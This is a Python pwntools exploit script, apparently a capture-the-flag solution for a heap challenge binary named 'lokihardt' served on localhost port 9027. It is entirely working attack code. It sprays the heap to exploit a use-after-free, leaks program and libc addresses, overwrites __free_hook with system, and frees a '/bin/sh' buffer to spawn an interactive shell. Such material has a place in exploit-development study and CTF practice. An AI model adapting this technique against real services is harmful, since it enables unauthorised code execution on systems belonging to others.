from pwn import *


def Alloc(index, rdata='', wdata=''):
    global refCount
    sh.recvuntil('> ')
    sh.sendline('1')
    sh.recvuntil('idx? ')
    sh.sendline(index)
    if refCount == 0:
        sh.send(rdata + wdata)
    refCount += 1


def Delete(index):
    global refCount
    sh.recvuntil('> ')
    sh.sendline('2')
    sh.recvuntil('idx? ')
    sh.sendline(index)
    refCount -= 1


def Use(index, objtype='', wdata=''):
    sh.recvuntil('> ')
    sh.sendline('3')
    sh.recvuntil('idx? ')
    sh.sendline(index)
    if objtype == 'write':
        if sh.recv(10) == 'your data?':
            sh.send(wdata)
        else:
            raise MyException

    elif objtype == 'read':
        leak = sh.recv(8)
        if leak == '- menu -':
            raise MyException
        else:
            return leak


def GC():
    sh.recvuntil('> ')
    sh.sendline('4')


def HeapSpray(num, rdata, wdata):
    for x in xrange(0, num):
        sh.recvuntil('> ')
        sh.sendline('5')
        sh.send(rdata + wdata)


class MyException(Exception):
    pass


bss_g_buf = 0x202040
bss_ArrayBuffer = 0x202080
got_stdout_ptr = 0x201f40
rodata_null_ptr = 0x1258
rodata_write_ptr = 0x12bd
offset_stdout = 0x3c4708
offset_system = 0x45380
offset_free_hook = 0x3c57a8

Local = False

while True:
    try:
        if Local:
            offset_system = 0x3f450
            offset_stdout = 0x39a6e8
            offset_free_hook = 0x39b788
            sh = process('./lokihardt')
        else:
            sh = remote('localhost', 9027)
        refCount = 0

        # 1st spray to leak NULL_PTR_ADDR
        Alloc('0', 'A'*256, 'a'*16)
        Delete('10')
        GC()
        HeapSpray(2, 'A'*256, 'read\x00'*3+'\x00')
        NULL_PTR_ADDR = u64(Use('0', 'read'))
        print '[+]step1 finish,leak NULL_PTR_ADDR:' + hex(NULL_PTR_ADDR)

        # 2nd spray write got_STDOUT_PTR_ADDR to ArrayBuffer[2]
        ARRAYBUFFER_ADDR = NULL_PTR_ADDR - rodata_null_ptr + bss_ArrayBuffer
        WRITE_PTR_ADDR = NULL_PTR_ADDR - rodata_null_ptr + rodata_write_ptr
        STDOUT_PTR_ADDR = NULL_PTR_ADDR - rodata_null_ptr + got_stdout_ptr
        print hex(ARRAYBUFFER_ADDR)
        Alloc('1', 'A'*256, 'a'*16)
        Delete('10')
        GC()
        HeapSpray(2, (p64(ARRAYBUFFER_ADDR+2*8)+p64(0x8) +
                      p64(WRITE_PTR_ADDR))*10+'A'*16, 'a'*16)
        Use('1', 'write', p64(STDOUT_PTR_ADDR))
        print '[+]step2 finish.'

        # 3rd leak got table from got_stdout_ptr
        Alloc('3', 'read\x00'*51+'\x00', 'a'*16)
        STDOUT_ADDR = u64(Use('2', 'read'))
        print '[+]step3 finish,leak STDOUT_ADDR:' + hex(STDOUT_ADDR)
        Delete('3')
        GC()
        # gdb.attach(sh)

        # 4th overwrite SYSTEM_ADDR on FREE_HOOK_ADDR
        SYSTEM_ADDR = STDOUT_ADDR - offset_stdout + offset_system
        FREE_HOOK_ADDR = STDOUT_ADDR - offset_stdout + offset_free_hook
        Alloc('3', 'write\x00\x00\x00'*32, p64(FREE_HOOK_ADDR)+p64(0x8))
        Use('2', 'write', p64(SYSTEM_ADDR))
        Delete('3')
        GC()
        print '[+]step4 finish,overwrite SYSTEM_ADDR(%x) on FREE_HOOK_ADDR(%x).' % (
            SYSTEM_ADDR, FREE_HOOK_ADDR)

        # 5th spray to get shell
        Alloc('3', '/bin/sh\x00'*32, 'a'*16)
        Delete('3')
        GC()

        # switch to shell
        print '[+]bingo!!'
        break

    except (MyException, EOFError) as e:
        print 'HeapSpray again.'
        sh.close()
        continue

    except Exception:
        raise

sh.interactive()
